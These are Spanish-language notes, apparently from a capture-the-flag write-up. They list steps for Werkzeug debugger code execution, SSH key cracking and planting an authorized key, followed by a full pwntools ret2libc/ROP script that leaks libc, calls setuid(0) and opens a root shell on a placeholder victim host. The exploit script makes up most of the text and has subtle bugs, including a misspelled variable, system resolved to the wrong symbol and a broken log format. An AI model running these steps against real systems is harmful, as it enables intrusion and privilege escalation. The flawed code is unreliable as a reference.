## Tecnicas utilizadas
-   Abusing Werkzeug Debugger (RCE)
-   Binary Exploitation
-   Advanced Buffer Overflow x64 - ROP / ASLR Bypass (Leaking Libc Address + Ret2libc + Setuid)
## Procedimiento
- RCE al generar un error con el gestor WerkZeug, otorga una consola de python y podemos ejecutar comandos desde ahi.
- ssh2john para desencriptar al ID_RSA que esta protegina con contraseña.
- Meter nuestra clave publica al authoraized key del .ssh del usuario victima.
- Observar los archivos que podemos leer siendo del grupo **adm**
- Crear diccionario personalizado con los filtros encontrados en la paginas.
- Utilizar **ltrace** para ver un poco mas en detalle el flujo del binario. Probar con **ldd** para comprobar si el ASRL esta activado(*Se lanza sobre el script*). Filtramos por *libc* y creamos un bucle para ver sin hay alteatorización, esto tambien se puede comprobar si tiramos un cat sobre /proc/sys/kernel/randomize_va_space, si el resultado da 0 es que esta desactivado.
- Nos pasamos el binary a nuestra maquina. Lanzamos un **checksec** para saber si tiene el *Data Execution Prevention*(**Si lo esta, lo que quiere decir es que no podremos inyectar shell code**). 
- Traer el *libc* de la maquina victima a la maquina atacante.
- usar **gdb** para analizar el binario y su ejecucion en busca del Buffer Overflow. Tenemos que fijarnos en el **$rsp**. No screamos una lista de letras aleatorias con ``pattern create``
- Le pasamos el **$rsp** al pattern offset para que nos diga en que cadena de carecteres se acontece. Printeamos la cadena de carecteres necesarios para sobreescribir el **\$rsp**(podemos utilizar python para mayor comodida ``python -c  'print("A"*136 + "B"*8)'``)
-> Python Scripting(bof):
```python
from pwn import *

# Functions
def def_handler(sig,frame):
	print("\n\n[!] Saliendo...")
	sys.exit(1)

def leak_libc_adress(p, elf, libc, rop):
	
	# PUTS(__libc_main_start)
	# rdi, rsi, rdx, rcx, r8, r9
	# gadget -> pop rdi, ret
	# rdi -> __libc_main_start
	# PUTS() -> rdi -> __libc_main_start -> PUTS(__libc_main_start)
	
	POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
	# log.info("pop rdi -> %s" % hex(POP_RDI))
	LIBC = elf.symbols["__libc_start_main"]
	MAIN = elf.symbols["main"]
	PUTS = elf.plt["puts"]
	
	offset = 136
	payload = b"A"*offset 
	payload += p64(POP_RDI)
	payload += p64(LIBC)
	payload += p64(PUTS)
	payload += p64(MAIN)
	
	p.recvuntil(b"password:")
	p.sendline(payload)
	
	p.recvline()
	p.recvline()
	leaked_libc = p.recvline().strip()
	leaked_libc = u64(leaked_libc.ljust(8, b"\x00"))
	
	# log.info("leaked libc address ->" % hex(leaked_libc))
	
	return leaked_libc

def shell(p, elf, libc, rop):
	
	# system("/bin/sh")
	# rdi, rsi, rdx, rcx, r8, r9
	# gadget -> pop rdi, ret
	# rdi -> "/bin/sh"
	# system() -> rdi? -> "/bin/sh" -> system("/bin/sh")
	RET = (rop.find_gadget(['ret']))[0]
	POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
	BIN_SH = next(libc.search(b"/bin/sh"))
	SYSTEM = libc.sym["__libc_start_main"]
	
	offset = 136
	payload = b"A"*offset
	paylod += p64(RET)
	payload += p64(POP_RDI)
	payload += p64(BIN_SH)
	payload += p64(SYSTEM)
	
	p.recvuntil(b"password:")
	p.sendline(payload)
	p.interactive()

def setuid(p, elf, libc, rop):
	
	#setuid(0)
	#gadget -> pop rdi, ret
	#rdi -> 0
	#setuid() -> rdi -> 0
	
	POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
	SETUID = libc.sym["setuid"]
	MAIN = elf.symbols['main']
	
	offset = 136
	payload = b"A"*offset
	payload += p64(POP_RDI)
	payload += p64(0)
	payload += p64(SETUID)
	payload += p64(MAIN)
	
	p.recvuntil(b"password:")
	p.sendline(payload)

#ctrl + c
signal.signal(signal.SIGINT, def_handler)

if __name__ == "__main__":

	#Establishing connection 
	r = ssh(host='<victim-ip>', user='<user>', password='<password>')
	p = r.process("<binary or program to launch>")
	
	elf = ELF("<./binary>")
	libc = ELF("<./libc>")
	rop = ROP(elf)
	
	leaked_libc_address = leak_libc_adress(p, elf, libc, rop)
	
	# Real leak_libc_address
	libc.address = leaked_libc_address - libc.sym["__libc_start_main"]
	
	log.info("real leaked_libc_address " % hex(libc.address))
	setuid(p, elf, libc, rop)
	shell(p, elf, libc, rop)
```